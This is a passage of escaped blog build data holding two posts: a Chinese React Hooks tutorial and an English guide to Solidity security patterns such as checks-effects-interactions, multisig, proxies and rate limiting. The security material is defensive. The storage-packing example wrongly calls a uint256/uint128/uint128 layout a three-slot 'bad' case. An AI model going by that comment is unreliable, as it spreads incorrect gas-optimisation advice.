\u7684\u4f7f\u7528\u65b9\u6cd5\u548c\u6700\u4f73\u5b9e\u8df5"},"unlisted":false,"prevItem":{"title":"NFT\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u6f0f\u6d1e\u5168\u89e3\u6790","permalink":"/nft-security-vulnerabilities"},"nextItem":{"title":"Solidity Security Patterns: Writing Secure Smart Contracts","permalink":"/solidity-security-patterns"}},"content":"React Hooks \u662f React 16.8 \u5f15\u5165\u7684\u65b0\u7279\u6027\uff0c\u8ba9\u4f60\u5728\u4e0d\u7f16\u5199 class \u7684\u60c5\u51b5\u4e0b\u4f7f\u7528 state \u548c\u5176\u4ed6 React \u7279\u6027\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u4e3a\u4ec0\u4e48\u9700\u8981 Hooks\uff1f\\n\\n\u5728 Hooks \u51fa\u73b0\u4e4b\u524d\uff0cReact \u7ec4\u4ef6\u4e3b\u8981\u5206\u4e3a\u4e24\u7c7b\uff1a\\n\\n- **\u7c7b\u7ec4\u4ef6**\uff1a\u53ef\u4ee5\u4f7f\u7528 state \u548c\u751f\u547d\u5468\u671f\u65b9\u6cd5\\n- **\u51fd\u6570\u7ec4\u4ef6**\uff1a\u53ea\u80fd\u63a5\u6536 props\uff0c\u88ab\u79f0\u4e3a\\"\u65e0\u72b6\u6001\u7ec4\u4ef6\\"\\n\\nHooks \u7684\u51fa\u73b0\u89e3\u51b3\u4e86\u4ee5\u4e0b\u95ee\u9898\uff1a\\n\\n1. **\u7ec4\u4ef6\u4e4b\u95f4\u590d\u7528\u72b6\u6001\u903b\u8f91\u56f0\u96be**\\n2. **\u590d\u6742\u7ec4\u4ef6\u96be\u4ee5\u7406\u89e3**\\n3. **class \u7ec4\u4ef6\u7684 this \u6307\u5411\u95ee\u9898**\\n\\n## \u5e38\u7528 Hooks\\n\\n### 1. useState - \u72b6\u6001\u7ba1\u7406\\n\\n```typescript\\nimport React, { useState } from \'react\';\\n\\nfunction Counter() {\\n  const [count, setCount] = useState(0);\\n\\n  return (\\n    <div>\\n      <p>\u5f53\u524d\u8ba1\u6570: {count}</p>\\n      <button onClick={() => setCount(count + 1)}>\\n        \u589e\u52a0\\n      </button>\\n    </div>\\n  );\\n}\\n```\\n\\n**\u6700\u4f73\u5b9e\u8df5\uff1a**\\n\\n```typescript\\n// \u2705 \u4f7f\u7528\u51fd\u6570\u5f0f\u66f4\u65b0\\nsetCount(prevCount => prevCount + 1);\\n\\n// \u274c \u907f\u514d\u76f4\u63a5\u4f7f\u7528\u5f53\u524d\u503c\\nsetCount(count + 1);\\n```\\n\\n### 2. useEffect - \u526f\u4f5c\u7528\u5904\u7406\\n\\n```typescript\\nimport React, { useState, useEffect } from \'react\';\\n\\nfunction UserProfile({ userId }: { userId: number }) {\\n  const [user, setUser] = useState(null);\\n  const [loading, setLoading] = useState(true);\\n\\n  useEffect(() => {\\n    // \u6570\u636e\u83b7\u53d6\\n    async function fetchUser() {\\n      setLoading(true);\\n      try {\\n        const response = await fetch(`/api/users/${userId}`);\\n        const data = await response.json();\\n        setUser(data);\\n      } catch (error) {\\n        console.error(\'\u83b7\u53d6\u7528\u6237\u5931\u8d25:\', error);\\n      } finally {\\n        setLoading(false);\\n      }\\n    }\\n\\n    fetchUser();\\n\\n    // \u6e05\u7406\u51fd\u6570\\n    return () => {\\n      // \u53d6\u6d88\u8bf7\u6c42\u6216\u6e05\u7406\u8ba2\u9605\\n    };\\n  }, [userId]); // \u4f9d\u8d56\u6570\u7ec4\\n\\n  if (loading) return <div>\u52a0\u8f7d\u4e2d...</div>;\\n  if (!user) return <div>\u7528\u6237\u4e0d\u5b58\u5728</div>;\\n\\n  return <div>\u7528\u6237\u540d: {user.name}</div>;\\n}\\n```\\n\\n### 3. useContext - \u4e0a\u4e0b\u6587\u7ba1\u7406\\n\\n```typescript\\nimport React, { createContext, useContext, useState } from \'react\';\\n\\n// \u521b\u5efa\u4e0a\u4e0b\u6587\\ninterface ThemeContextType {\\n  theme: \'light\' | \'dark\';\\n  toggleTheme: () => void;\\n}\\n\\nconst ThemeContext = createContext<ThemeContextType | undefined>(undefined);\\n\\n// Provider \u7ec4\u4ef6\\nexport function ThemeProvider({ children }: { children: React.ReactNode }) {\\n  const [theme, setTheme] = useState<\'light\' | \'dark\'>(\'light\');\\n\\n  const toggleTheme = () => {\\n    setTheme(prev => prev === \'light\' ? \'dark\' : \'light\');\\n  };\\n\\n  return (\\n    <ThemeContext.Provider value={{ theme, toggleTheme }}>\\n      {children}\\n    </ThemeContext.Provider>\\n  );\\n}\\n\\n// \u81ea\u5b9a\u4e49 Hook\\nexport function useTheme() {\\n  const context = useContext(ThemeContext);\\n  if (context === undefined) {\\n    throw new Error(\'useTheme must be used within ThemeProvider\');\\n  }\\n  return context;\\n}\\n\\n// \u4f7f\u7528\\nfunction ThemedButton() {\\n  const { theme, toggleTheme } = useTheme();\\n  \\n  return (\\n    <button \\n      onClick={toggleTheme}\\n      style={{ \\n        background: theme === \'light\' ? \'#fff\' : \'#333\',\\n        color: theme === \'light\' ? \'#333\' : \'#fff\'\\n      }}\\n    >\\n      \u5207\u6362\u4e3b\u9898\\n    </button>\\n  );\\n}\\n```\\n\\n### 4. useReducer - \u590d\u6742\u72b6\u6001\u7ba1\u7406\\n\\n```typescript\\nimport React, { useReducer } from \'react\';\\n\\n// \u5b9a\u4e49\u72b6\u6001\u7c7b\u578b\\ninterface State {\\n  count: number;\\n  step: number;\\n}\\n\\n// \u5b9a\u4e49 action \u7c7b\u578b\\ntype Action = \\n  | { type: \'increment\' }\\n  | { type: \'decrement\' }\\n  | { type: \'setStep\'; payload: number }\\n  | { type: \'reset\' };\\n\\n// Reducer \u51fd\u6570\\nfunction counterReducer(state: State, action: Action): State {\\n  switch (action.type) {\\n    case \'increment\':\\n      return { ...state, count: state.count + state.step };\\n    case \'decrement\':\\n      return { ...state, count: state.count - state.step };\\n    case \'setStep\':\\n      return { ...state, step: action.payload };\\n    case \'reset\':\\n      return { count: 0, step: 1 };\\n    default:\\n      return state;\\n  }\\n}\\n\\nfunction Counter() {\\n  const [state, dispatch] = useReducer(counterReducer, { count: 0, step: 1 });\\n\\n  return (\\n    <div>\\n      <p>\u8ba1\u6570: {state.count}</p>\\n      <p>\u6b65\u957f: {state.step}</p>\\n      <button onClick={() => dispatch({ type: \'increment\' })}>+</button>\\n      <button onClick={() => dispatch({ type: \'decrement\' })}>-</button>\\n      <input\\n        type=\\"number\\"\\n        value={state.step}\\n        onChange={(e) => dispatch({ \\n          type: \'setStep\', \\n          payload: Number(e.target.value) \\n        })}\\n      />\\n      <button onClick={() => dispatch({ type: \'reset\' })}>\u91cd\u7f6e</button>\\n    </div>\\n  );\\n}\\n```\\n\\n### 5. useMemo \u548c useCallback - \u6027\u80fd\u4f18\u5316\\n\\n```typescript\\nimport React, { useState, useMemo, useCallback } from \'react\';\\n\\nfunction ExpensiveComponent() {\\n  const [count, setCount] = useState(0);\\n  const [items, setItems] = useState<number[]>([]);\\n\\n  // useMemo: \u7f13\u5b58\u8ba1\u7b97\u7ed3\u679c\\n  const expensiveValue = useMemo(() => {\\n    console.log(\'\u8ba1\u7b97\u6602\u8d35\u7684\u503c...\');\\n    return items.reduce((sum, item) => sum + item, 0);\\n  }, [items]); // \u53ea\u5728 items \u53d8\u5316\u65f6\u91cd\u65b0\u8ba1\u7b97\\n\\n  // useCallback: \u7f13\u5b58\u51fd\u6570\\n  const handleAddItem = useCallback(() => {\\n    setItems(prev => [...prev, Math.random()]);\\n  }, []); // \u51fd\u6570\u6c38\u8fdc\u4e0d\u4f1a\u6539\u53d8\\n\\n  return (\\n    <div>\\n      <p>\u603b\u548c: {expensiveValue}</p>\\n      <p>\u70b9\u51fb\u6b21\u6570: {count}</p>\\n      <button onClick={() => setCount(c => c + 1)}>\u589e\u52a0\u8ba1\u6570</button>\\n      <button onClick={handleAddItem}>\u6dfb\u52a0\u9879\u76ee</button>\\n    </div>\\n  );\\n}\\n```\\n\\n### 6. useRef - \u5f15\u7528\u548c DOM \u8bbf\u95ee\\n\\n```typescript\\nimport React, { useRef, useEffect } from \'react\';\\n\\nfunction TextInputWithFocus() {\\n  const inputRef = useRef<HTMLInputElement>(null);\\n  const renderCount = useRef(0);\\n\\n  useEffect(() => {\\n    // \u7ec4\u4ef6\u6302\u8f7d\u65f6\u81ea\u52a8\u805a\u7126\\n    inputRef.current?.focus();\\n    \\n    // \u8bb0\u5f55\u6e32\u67d3\u6b21\u6570\uff08\u4e0d\u4f1a\u89e6\u53d1\u91cd\u65b0\u6e32\u67d3\uff09\\n    renderCount.current += 1;\\n  });\\n\\n  return (\\n    <div>\\n      <input ref={inputRef} type=\\"text\\" />\\n      <p>\u6e32\u67d3\u6b21\u6570: {renderCount.current}</p>\\n    </div>\\n  );\\n}\\n```\\n\\n## \u81ea\u5b9a\u4e49 Hooks\\n\\n\u81ea\u5b9a\u4e49 Hooks \u8ba9\u4f60\u53ef\u4ee5\u63d0\u53d6\u7ec4\u4ef6\u903b\u8f91\u5230\u53ef\u590d\u7528\u7684\u51fd\u6570\u4e2d\uff1a\\n\\n```typescript\\nimport { useState, useEffect } from \'react\';\\n\\n// \u81ea\u5b9a\u4e49 Hook: \u7a97\u53e3\u5c3a\u5bf8\\nfunction useWindowSize() {\\n  const [size, setSize] = useState({\\n    width: window.innerWidth,\\n    height: window.innerHeight,\\n  });\\n\\n  useEffect(() => {\\n    const handleResize = () => {\\n      setSize({\\n        width: window.innerWidth,\\n        height: window.innerHeight,\\n      });\\n    };\\n\\n    window.addEventListener(\'resize\', handleResize);\\n    return () => window.removeEventListener(\'resize\', handleResize);\\n  }, []);\\n\\n  return size;\\n}\\n\\n// \u4f7f\u7528\u81ea\u5b9a\u4e49 Hook\\nfunction ResponsiveComponent() {\\n  const { width, height } = useWindowSize();\\n\\n  return (\\n    <div>\\n      \u7a97\u53e3\u5c3a\u5bf8: {width} x {height}\\n    </div>\\n  );\\n}\\n```\\n\\n```typescript\\n// \u81ea\u5b9a\u4e49 Hook: \u672c\u5730\u5b58\u50a8\\nfunction useLocalStorage<T>(key: string, initialValue: T) {\\n  const [storedValue, setStoredValue] = useState<T>(() => {\\n    try {\\n      const item = window.localStorage.getItem(key);\\n      return item ? JSON.parse(item) : initialValue;\\n    } catch (error) {\\n      console.error(error);\\n      return initialValue;\\n    }\\n  });\\n\\n  const setValue = (value: T | ((val: T) => T)) => {\\n    try {\\n      const valueToStore = value instanceof Function ? value(storedValue) : value;\\n      setStoredValue(valueToStore);\\n      window.localStorage.setItem(key, JSON.stringify(valueToStore));\\n    } catch (error) {\\n      console.error(error);\\n    }\\n  };\\n\\n  return [storedValue, setValue] as const;\\n}\\n\\n// \u4f7f\u7528\\nfunction App() {\\n  const [name, setName] = useLocalStorage(\'name\', \'Guest\');\\n\\n  return (\\n    <input\\n      value={name}\\n      onChange={(e) => setName(e.target.value)}\\n    />\\n  );\\n}\\n```\\n\\n## Hooks \u4f7f\u7528\u89c4\u5219\\n\\n### \u89c4\u5219 1: \u53ea\u5728\u6700\u9876\u5c42\u4f7f\u7528 Hooks\\n\\n\u274c **\u9519\u8bef\u793a\u4f8b\uff1a**\\n\\n```typescript\\nfunction BadComponent() {\\n  if (condition) {\\n    const [count, setCount] = useState(0); // \u274c \u4e0d\u8981\u5728\u6761\u4ef6\u8bed\u53e5\u4e2d\u4f7f\u7528\\n  }\\n  \\n  for (let i = 0; i < 10; i++) {\\n    useEffect(() => {}); // \u274c \u4e0d\u8981\u5728\u5faa\u73af\u4e2d\u4f7f\u7528\\n  }\\n}\\n```\\n\\n\u2705 **\u6b63\u786e\u793a\u4f8b\uff1a**\\n\\n```typescript\\nfunction GoodComponent() {\\n  const [count, setCount] = useState(0);\\n  \\n  useEffect(() => {\\n    if (condition) {\\n      // \u6761\u4ef6\u903b\u8f91\u653e\u5728 Hook \u5185\u90e8\\n    }\\n  });\\n}\\n```\\n\\n### \u89c4\u5219 2: \u53ea\u5728 React \u51fd\u6570\u4e2d\u4f7f\u7528 Hooks\\n\\n- \u2705 \u5728 React \u51fd\u6570\u7ec4\u4ef6\u4e2d\u4f7f\u7528\\n- \u2705 \u5728\u81ea\u5b9a\u4e49 Hook \u4e2d\u4f7f\u7528\\n- \u274c \u4e0d\u8981\u5728\u666e\u901a JavaScript \u51fd\u6570\u4e2d\u4f7f\u7528\\n\\n## \u6027\u80fd\u4f18\u5316\u6280\u5de7\\n\\n### 1. \u907f\u514d\u4e0d\u5fc5\u8981\u7684\u91cd\u65b0\u6e32\u67d3\\n\\n```typescript\\nimport React, { memo } from \'react\';\\n\\n// \u4f7f\u7528 React.memo \u5305\u88f9\u7ec4\u4ef6\\nconst ExpensiveChild = memo(function ExpensiveChild({ data }: { data: string }) {\\n  console.log(\'ExpensiveChild \u6e32\u67d3\');\\n  return <div>{data}</div>;\\n});\\n\\nfunction Parent() {\\n  const [count, setCount] = useState(0);\\n  const data = useMemo(() => \'static data\', []); // \u7f13\u5b58 props\\n\\n  return (\\n    <div>\\n      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>\\n      <ExpensiveChild data={data} />\\n    </div>\\n  );\\n}\\n```\\n\\n### 2. \u5408\u7406\u4f7f\u7528\u4f9d\u8d56\u6570\u7ec4\\n\\n```typescript\\n// \u274c \u7f3a\u5c11\u4f9d\u8d56\\nuseEffect(() => {\\n  console.log(count);\\n}, []); // count \u53d8\u5316\u65f6\u4e0d\u4f1a\u91cd\u65b0\u6267\u884c\\n\\n// \u2705 \u6b63\u786e\u7684\u4f9d\u8d56\\nuseEffect(() => {\\n  console.log(count);\\n}, [count]);\\n\\n// \u2705 \u7a7a\u4f9d\u8d56\u6570\u7ec4\uff08\u4ec5\u5728\u6302\u8f7d\u65f6\u6267\u884c\uff09\\nuseEffect(() => {\\n  console.log(\'\u7ec4\u4ef6\u6302\u8f7d\');\\n}, []);\\n```\\n\\n## \u603b\u7ed3\\n\\nReact Hooks \u7684\u6838\u5fc3\u4f18\u52bf\uff1a\\n\\n1. **\u66f4\u7b80\u6d01\u7684\u4ee3\u7801** - \u65e0\u9700 class \u7ec4\u4ef6\\n2. **\u66f4\u597d\u7684\u903b\u8f91\u590d\u7528** - \u901a\u8fc7\u81ea\u5b9a\u4e49 Hooks\\n3. **\u66f4\u6e05\u6670\u7684\u526f\u4f5c\u7528\u7ba1\u7406** - useEffect\\n4. **\u66f4\u597d\u7684 TypeScript \u652f\u6301**\\n\\n\u8bb0\u4f4f Hooks \u7684\u4e24\u4e2a\u89c4\u5219\uff0c\u5408\u7406\u4f7f\u7528\u4f9d\u8d56\u6570\u7ec4\uff0c\u4f60\u5c31\u80fd\u5145\u5206\u53d1\u6325 Hooks \u7684\u5a01\u529b\uff01\\n\\n## \u53c2\u8003\u8d44\u6e90\\n\\n- [React Hooks \u5b98\u65b9\u6587\u6863](https://react.dev/reference/react)\\n- [useHooks - \u81ea\u5b9a\u4e49 Hooks \u96c6\u5408](https://usehooks.com/)\\n- [React TypeScript Cheatsheet](https://react-typescript-cheatsheet.netlify.app/)"},{"id":"solidity-security-patterns","metadata":{"permalink":"/solidity-security-patterns","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-01-solidity-security-patterns.md","source":"@site/blog/2025/02-01-solidity-security-patterns.md","title":"Solidity Security Patterns: Writing Secure Smart Contracts","description":"Writing secure smart contracts requires more than just knowing Solidity syntax. It demands understanding common vulnerabilities and applying proven security patterns. This guide covers essential patterns every Solidity developer should know.","date":"2025-02-01T00:00:00.000Z","tags":[{"inline":true,"label":"Solidity","permalink":"/tags/solidity"},{"inline":true,"label":"smart contract security","permalink":"/tags/smart-contract-security"},{"inline":true,"label":"security patterns","permalink":"/tags/security-patterns"},{"inline":true,"label":"best practices","permalink":"/tags/best-practices"},{"inline":true,"label":"Web3","permalink":"/tags/web-3"}],"readingTime":5.2,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"solidity-security-patterns","title":"Solidity Security Patterns: Writing Secure Smart Contracts","authors":["autosec"],"tags":["Solidity","smart contract security","security patterns","best practices","Web3"]},"unlisted":false,"prevItem":{"title":"React Hooks \u5b8c\u5168\u6307\u5357","permalink":"/react-hooks-guide"},"nextItem":{"title":"Web3\u94b1\u5305\u5b89\u5168\u5b8c\u5168\u6307\u5357\uff1a\u4ece\u539f\u7406\u5230\u5b9e\u8df5","permalink":"/web3-wallet-security"}},"content":"Writing secure smart contracts requires more than just knowing Solidity syntax. It demands understanding common vulnerabilities and applying proven security patterns. This guide covers essential patterns every Solidity developer should know.\\n\\n\x3c!--truncate--\x3e\\n\\n## Fundamental Security Patterns\\n\\n### 1. Checks-Effects-Interactions Pattern\\n\\nThe most important pattern for preventing reentrancy attacks.\\n\\n```solidity\\ncontract SecureWithdrawal {\\n    mapping(address => uint256) public balances;\\n    \\n    function withdraw(uint256 amount) external {\\n        // CHECKS: Validate conditions\\n        require(balances[msg.sender] >= amount, \\"Insufficient balance\\");\\n        require(amount > 0, \\"Amount must be positive\\");\\n        \\n        // EFFECTS: Update state\\n        balances[msg.sender] -= amount;\\n        \\n        // INTERACTIONS: External calls\\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n    }\\n}\\n```\\n\\n### 2. Pull Over Push Pattern\\n\\nInstead of pushing payments, let users pull them.\\n\\n```solidity\\ncontract PullPayment {\\n    mapping(address => uint256) public pendingWithdrawals;\\n    \\n    function allowWithdrawal(address payee, uint256 amount) internal {\\n        pendingWithdrawals[payee] += amount;\\n    }\\n    \\n    function withdraw() external {\\n        uint256 amount = pendingWithdrawals[msg.sender];\\n        require(amount > 0, \\"No funds to withdraw\\");\\n        \\n        pendingWithdrawals[msg.sender] = 0;\\n        \\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n    }\\n}\\n```\\n\\n### 3. Rate Limiting\\n\\nProtect against spam and abuse.\\n\\n```solidity\\ncontract RateLimited {\\n    mapping(address => uint256) public lastActionTime;\\n    mapping(address => uint256) public actionCount;\\n    \\n    uint256 public constant COOLDOWN_PERIOD = 1 hours;\\n    uint256 public constant MAX_ACTIONS_PER_PERIOD = 10;\\n    \\n    modifier rateLimit() {\\n        if (block.timestamp > lastActionTime[msg.sender] + COOLDOWN_PERIOD) {\\n            actionCount[msg.sender] = 0;\\n            lastActionTime[msg.sender] = block.timestamp;\\n        }\\n        \\n        require(\\n            actionCount[msg.sender] < MAX_ACTIONS_PER_PERIOD,\\n            \\"Rate limit exceeded\\"\\n        );\\n        \\n        actionCount[msg.sender]++;\\n        _;\\n    }\\n    \\n    function performAction() external rateLimit {\\n        // Action logic\\n    }\\n}\\n```\\n\\n## Access Control Patterns\\n\\n### 1. Role-Based Access Control (RBAC)\\n\\n```solidity\\nimport \\"@openzeppelin/contracts/access/AccessControl.sol\\";\\n\\ncontract RBACExample is AccessControl {\\n    bytes32 public constant ADMIN_ROLE = keccak256(\\"ADMIN_ROLE\\");\\n    bytes32 public constant MINTER_ROLE = keccak256(\\"MINTER_ROLE\\");\\n    bytes32 public constant BURNER_ROLE = keccak256(\\"BURNER_ROLE\\");\\n    \\n    constructor() {\\n        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\\n        _setupRole(ADMIN_ROLE, msg.sender);\\n    }\\n    \\n    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {\\n        // Mint logic\\n    }\\n    \\n    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {\\n        // Burn logic\\n    }\\n    \\n    function grantMinterRole(address account) external onlyRole(ADMIN_ROLE) {\\n        grantRole(MINTER_ROLE, account);\\n    }\\n}\\n```\\n\\n### 2. Multi-Signature Pattern\\n\\n```solidity\\ncontract MultiSig {\\n    address[] public owners;\\n    mapping(address => bool) public isOwner;\\n    uint256 public required;\\n    \\n    struct Transaction {\\n        address to;\\n        uint256 value;\\n        bytes data;\\n        bool executed;\\n        uint256 confirmations;\\n    }\\n    \\n    Transaction[] public transactions;\\n    mapping(uint256 => mapping(address => bool)) public confirmations;\\n    \\n    modifier onlyOwner() {\\n        require(isOwner[msg.sender], \\"Not owner\\");\\n        _;\\n    }\\n    \\n    modifier txExists(uint256 txId) {\\n        require(txId < transactions.length, \\"Transaction does not exist\\");\\n        _;\\n    }\\n    \\n    modifier notExecuted(uint256 txId) {\\n        require(!transactions[txId].executed, \\"Transaction already executed\\");\\n        _;\\n    }\\n    \\n    constructor(address[] memory _owners, uint256 _required) {\\n        require(_owners.length > 0, \\"Owners required\\");\\n        require(\\n            _required > 0 && _required <= _owners.length,\\n            \\"Invalid required number\\"\\n        );\\n        \\n        for (uint256 i = 0; i < _owners.length; i++) {\\n            address owner = _owners[i];\\n            require(owner != address(0), \\"Invalid owner\\");\\n            require(!isOwner[owner], \\"Owner not unique\\");\\n            \\n            isOwner[owner] = true;\\n            owners.push(owner);\\n        }\\n        \\n        required = _required;\\n    }\\n    \\n    function submitTransaction(\\n        address to,\\n        uint256 value,\\n        bytes memory data\\n    ) external onlyOwner returns (uint256) {\\n        uint256 txId = transactions.length;\\n        \\n        transactions.push(Transaction({\\n            to: to,\\n            value: value,\\n            data: data,\\n            executed: false,\\n            confirmations: 0\\n        }));\\n        \\n        return txId;\\n    }\\n    \\n    function confirmTransaction(uint256 txId)\\n        external\\n        onlyOwner\\n        txExists(txId)\\n        notExecuted(txId)\\n    {\\n        require(!confirmations[txId][msg.sender], \\"Transaction already confirmed\\");\\n        \\n        confirmations[txId][msg.sender] = true;\\n        transactions[txId].confirmations++;\\n        \\n        if (transactions[txId].confirmations >= required) {\\n            executeTransaction(txId);\\n        }\\n    }\\n    \\n    function executeTransaction(uint256 txId) internal {\\n        Transaction storage transaction = transactions[txId];\\n        transaction.executed = true;\\n        \\n        (bool success, ) = transaction.to.call{value: transaction.value}(\\n            transaction.data\\n        );\\n        require(success, \\"Transaction execution failed\\");\\n    }\\n}\\n```\\n\\n## State Machine Pattern\\n\\nEnforce valid state transitions.\\n\\n```solidity\\ncontract Crowdfunding {\\n    enum State { Fundraising, Expired, Successful }\\n    \\n    State public state = State.Fundraising;\\n    uint256 public deadline;\\n    uint256 public goal;\\n    uint256 public totalRaised;\\n    \\n    modifier inState(State _state) {\\n        require(state == _state, \\"Invalid state\\");\\n        _;\\n    }\\n    \\n    modifier checkDeadline() {\\n        if (block.timestamp > deadline && state == State.Fundraising) {\\n            state = totalRaised >= goal ? State.Successful : State.Expired;\\n        }\\n        _;\\n    }\\n    \\n    function contribute() external payable inState(State.Fundraising) checkDeadline {\\n        require(msg.value > 0, \\"Contribution must be positive\\");\\n        \\n        totalRaised += msg.value;\\n        \\n        if (totalRaised >= goal) {\\n            state = State.Successful;\\n        }\\n    }\\n    \\n    function withdraw() external inState(State.Successful) {\\n        // Withdrawal logic\\n    }\\n    \\n    function refund() external inState(State.Expired) {\\n        // Refund logic\\n    }\\n}\\n```\\n\\n## Emergency Stop Pattern\\n\\n```solidity\\ncontract EmergencyStop {\\n    address public owner;\\n    bool public stopped;\\n    \\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\"Not owner\\");\\n        _;\\n    }\\n    \\n    modifier stopInEmergency() {\\n        require(!stopped, \\"Contract is stopped\\");\\n        _;\\n    }\\n    \\n    modifier onlyInEmergency() {\\n        require(stopped, \\"Not in emergency\\");\\n        _;\\n    }\\n    \\n    function toggleContractActive() external onlyOwner {\\n        stopped = !stopped;\\n    }\\n    \\n    function deposit() external payable stopInEmergency {\\n        // Normal operation\\n    }\\n    \\n    function emergencyWithdraw() external onlyInEmergency {\\n        // Emergency operation\\n    }\\n}\\n```\\n\\n## Secure Randomness Pattern\\n\\n```solidity\\nimport \\"@chainlink/contracts/src/v0.8/VRFConsumerBase.sol\\";\\n\\ncontract SecureRandom is VRFConsumerBase {\\n    bytes32 internal keyHash;\\n    uint256 internal fee;\\n    uint256 public randomResult;\\n    \\n    mapping(bytes32 => address) public requestToSender;\\n    \\n    event RandomnessRequested(bytes32 requestId);\\n    event RandomnessFulfilled(bytes32 requestId, uint256 randomness);\\n    \\n    constructor(\\n        address _vrfCoordinator,\\n        address _link,\\n        bytes32 _keyHash,\\n        uint256 _fee\\n    ) VRFConsumerBase(_vrfCoordinator, _link) {\\n        keyHash = _keyHash;\\n        fee = _fee;\\n    }\\n    \\n    function getRandomNumber() external returns (bytes32 requestId) {\\n        require(LINK.balanceOf(address(this)) >= fee, \\"Not enough LINK\\");\\n        \\n        requestId = requestRandomness(keyHash, fee);\\n        requestToSender[requestId] = msg.sender;\\n        \\n        emit RandomnessRequested(requestId);\\n        return requestId;\\n    }\\n    \\n    function fulfillRandomness(bytes32 requestId, uint256 randomness)\\n        internal\\n        override\\n    {\\n        randomResult = randomness;\\n        emit RandomnessFulfilled(requestId, randomness);\\n    }\\n}\\n```\\n\\n## Upgrade Patterns\\n\\n### Transparent Proxy Pattern\\n\\n```solidity\\ncontract TransparentProxy {\\n    address public implementation;\\n    address public admin;\\n    \\n    modifier onlyAdmin() {\\n        require(msg.sender == admin, \\"Not admin\\");\\n        _;\\n    }\\n    \\n    constructor(address _implementation) {\\n        implementation = _implementation;\\n        admin = msg.sender;\\n    }\\n    \\n    function upgradeTo(address newImplementation) external onlyAdmin {\\n        require(newImplementation != address(0), \\"Invalid address\\");\\n        implementation = newImplementation;\\n    }\\n    \\n    fallback() external payable {\\n        address impl = implementation;\\n        \\n        assembly {\\n            calldatacopy(0, 0, calldatasize())\\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\\n            returndatacopy(0, 0, returndatasize())\\n            \\n            switch result\\n            case 0 { revert(0, returndatasize()) }\\n            default { return(0, returndatasize()) }\\n        }\\n    }\\n}\\n```\\n\\n## Gas Optimization Patterns\\n\\n### 1. Packing Storage Variables\\n\\n```solidity\\ncontract GasOptimized {\\n    // Bad: Uses 3 storage slots\\n    uint256 a;  // slot 0\\n    uint128 b;  // slot 1\\n    uint128 c;  // slot 2\\n    \\n    // Good: Uses 2 storage slots\\n    uint256 x;      // slot 0\\n    uint128 y;      // slot 1\\n    uint128 z;      // slot 1 (packed with y)\\n}\\n```\\n\\n### 2. Using Events for Data Storage\\n\\n```solidity\\ncontract EventStorage {\\n    event DataStored(uint256 indexed id, bytes data);\\n    \\n    // Instead of storing in state (expensive)\\n    // mapping(uint256 => bytes) public data;\\n    \\n    // Emit events (cheaper)\\n    function storeData(uint256 id, bytes memory data) external {\\n        emit DataStored(id, data);\\n    }\\n}\\n```\\n\\n## Testing Patterns\\n\\n```javascript\\nconst { expect } = require(\\"chai\\");\\nconst { ethers } = require(\\"hardhat\\");\\n\\ndescribe(\\"Security Patterns\\", function() {\\n    let contract;\\n    let owner, user1, user2;\\n    \\n    beforeEach(async function() {\\n        [owner, user1, user2] = await ethers.getSigners();\\n        \\n        const Contract = await ethers.getContractFactory(\\"SecureContract\\");\\n        contract = await Contract.deploy();\\n        await contract.deployed();\\n    });\\n    \\n    describe(\\"Access Control\\", function() {\\n        it(\\"Should only allow owner to perform admin actions\\", async function() {\\n            await expect(\\n                contract.connect(user1).adminFunction()\\n            ).to.be.revertedWith(\\"Not owner\\");\\n        });\\n    });\\n    \\n    describe(\\"Reentrancy Protection\\", function() {\\n        it(\\"Should prevent reentrancy attacks\\", async function() {\\n            const Attacker = await ethers.getContractFactory(\\"ReentrancyAttacker\\");\\n            const attacker = await Attacker.deploy(contract.address);\\n            \\n            await expect(\\n                attacker.attack({ value: ethers.utils.parseEther(\\"1\\") })\\n            ).to.be.reverted;\\n        });\\n    });\\n    \\n    describe(\\"Rate Limiting\\", function() {\\n        it(\\"Should enforce rate limits\\", async function() {\\n            for (let i = 0; i < 10; i++) {\\n                await contract.performAction();\\n            }\\n            \\n            await expect(\\n                contract.performAction()\\n            ).to.be.revertedWith(\\"Rate limit exceeded\\");\\n        });\\n    });\\n});\\n```\\n\\n## Conclusion\\n\\nSecure smart contract development requires:\\n\\n- \ud83d\udd12 **Consistent application of security patterns**\\n- \ud83e\uddea **Comprehensive testing**\\n- \ud83d\udcca **Regular audits**\\n- \ud83d\udd04 **Continuous learning**\\n\\nRemember: **Security is not a feature, it\'s a requirement.**\\n\\n---\\n\\n**AutoSec** - Building secure Web3 applications through proven patterns and best practices."},{"id":"web3-wallet-security","metadata":{"permalink":"/web3-wallet-security","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/01-31-web3-wallet-security.md","source":"@site/blog/2025/01-31-web3-wallet-security.md","title":"Web3\u94b1\u5305\u5b89\u5168\u5b8c\u5168\u6307\u5357\uff1a\u4ece\u539f\u7406\u5230\u5b9e\u8df5","description":"Web3\u94b1\u5305\u662f\u7528\u6237\u8fdb\u5165\u533a\u5757\u94fe\u4e16\u754c\u7684\u95e8\u6237\uff0c\u4f46\u4e5f\u662f\u6700\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u7684\u73af\u8282\u3002\u672c\u6587\u5c06\u6df1\u5165\u63a2\u8ba8\u94b1\u5305\u5b89\u5168\u7684\u5404\u4e2a\u65b9\u9762\uff0c\u4ece\u6280\u672f\u539f\u7406\u5230\u5b9e\u8df5\u5efa\u8bae\u3002","date":"2025-01-31T00:00:00.000Z","tags":[{"inline":true,"label":"\u94b1\u5305\u5b89\u5168","permalink":"/tags/\u94b1\u5305\u5b89\u5168"},{"inline":true,"label":"\u79c1\u94a5\u7ba1\u7406","permalink":"/tags/\u79c1\u94a5\u7ba1\u7406"},{"inline":true,"label":"Web3\u5b89\u5168","permalink":"/tags/